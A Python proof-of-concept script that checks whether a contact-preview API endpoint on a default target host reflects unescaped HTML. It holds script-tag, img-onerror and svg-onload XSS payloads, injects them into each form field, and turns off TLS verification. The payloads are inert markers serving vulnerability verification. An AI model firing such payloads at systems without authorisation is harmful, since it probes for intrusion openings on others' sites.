     1	#!/usr/bin/env python3
     2	"""Verify: Reflected XSS in POST /api/contact/preview.
     3	
     4	Sends four separate requests, each injecting a distinct HTML payload into a
     5	different form field (name, email, subject, message), and asserts that the
     6	raw payload appears verbatim inside a response served with
     7	Content-Type: text/html. If any field reflects unescaped in a text/html
     8	response, the vulnerability is present.
     9	
    10	Optional environment variables:
    11	    TARGET_URL   Base URL (default: https://taintedport.com)
    12	
    13	Usage:
    14	    python3 verify.py
    15	
    16	Exit codes:
    17	    0 — VULNERABLE
    18	    1 — NOT VULNERABLE (or error)
    19	"""
    20	import os
    21	import sys
    22	import requests
    23	import urllib3
    24	
    25	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    26	
    27	TARGET_URL = os.environ.get("TARGET_URL", "https://taintedport.com")
    28	
    29	# Unique verbatim markers; if any of these appears in a text/html response, the
    30	# server did not HTML-encode that input.
    31	PAYLOADS = {
    32	    "name":    "<script>vfy_name_9351()</script>",
    33	    "email":   "<script>vfy_email_9352()</script>",
    34	    "subject": "<img src=x onerror=vfy_subj_9353()>",
    35	    "message": "<svg onload=vfy_msg_9354()>",
    36	}
    37	
    38	BASE = {"name": "N", "email": "n@n.co", "subject": "S", "message": "M"}
    39	
    40	
    41	def check():
    42	    reflected = []
    43	    for field, payload in PAYLOADS.items():
    44	        data = dict(BASE)
    45	        data[field] = payload
    46	        try:
    47	            r = requests.post(f"{TARGET_URL}/api/contact/preview",
    48	                              data=data, verify=False, timeout=20)
    49	        except requests.RequestException as e:
    50	            print(f"[ERROR] request for field={field} failed: {e}")
    51	            sys.exit(1)
    52	        ctype = r.headers.get("content-type", "")
    53	        is_html = ctype.lower().startswith("text/html")
    54	        # The email field triggers Cloudflare's email obfuscation only when the
    55	        # value looks like an @-address, so PAYLOADS['email'] deliberately does
    56	        # not include an @-sign.
    57	        verbatim = payload in r.text
    58	        marker = "OK" if (is_html and verbatim) else "NO"
    59	        print(f"  [{marker}] field={field:8s} status={r.status_code} "
    60	              f"content-type={ctype!r} verbatim={verbatim}")
    61	        if is_html and verbatim:
    62	            reflected.append(field)
    63	
    64	    if reflected:
    65	        print(f"[VULNERABLE] {TARGET_URL}/api/contact/preview reflects unescaped "
    66	              f"HTML in field(s): {', '.join(reflected)}")
    67	        sys.exit(0)
    68	    else:
    69	        print(f"[NOT VULNERABLE] {TARGET_URL}/api/contact/preview did not reflect "
    70	              f"any test payload verbatim in a text/html response.")
    71	        sys.exit(1)
    72	
    73	
    74	if __name__ == "__main__":
    75	    check()